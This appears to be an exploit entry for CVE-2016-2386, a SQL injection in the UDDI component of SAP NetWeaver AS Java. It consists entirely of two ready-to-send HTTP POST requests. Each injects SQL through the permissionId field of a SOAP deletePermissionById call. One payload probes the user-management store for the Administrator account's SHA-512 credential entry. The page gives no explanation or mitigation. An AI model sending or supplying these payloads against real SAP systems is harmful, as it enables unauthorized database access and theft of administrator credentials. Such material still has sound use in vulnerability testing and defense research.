<b>[CVE-2016-2386] SAP NetWeaver AS JAVA UDDI Component SQL Injection</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```
POST /UDDISecurityService/UDDISecurityImplBean HTTP/1.1
Host: host
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length: 340

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sec="http://sap.com/esi/uddi/ejb/security/">
    <soapenv:Header />
    <soapenv:Body>
        <sec:deletePermissionById>
            <permissionId>1' AND 1=(select COUNT(*) from J2EE_CONFIGENTRY, UME_STRINGS where UME_STRINGS.PID like '%PRIVATE_DATASOURCE.un:Administrator%' and UME_STRINGS.VAL like '%SHA-512%') AND '1'='1</permissionId>
        </sec:deletePermissionById>
    </soapenv:Body>
</soapenv:Envelope>
```

```
POST /UDDISecurityService/UDDISecurityImplBean HTTP/1.1
Host: host
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length: 340

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sec="http://sap.com/esi/uddi/ejb/security/">
    <soapenv:Header />
    <soapenv:Body>
        <sec:deletePermissionById>
            <permissionId>x' AND 1=(SELECT COUNT(*) FROM BC_UDV3_EL8EM_KEY) or '1'='1</permissionId>
        </sec:deletePermissionById>
    </soapenv:Body>
</soapenv:Envelope>
```
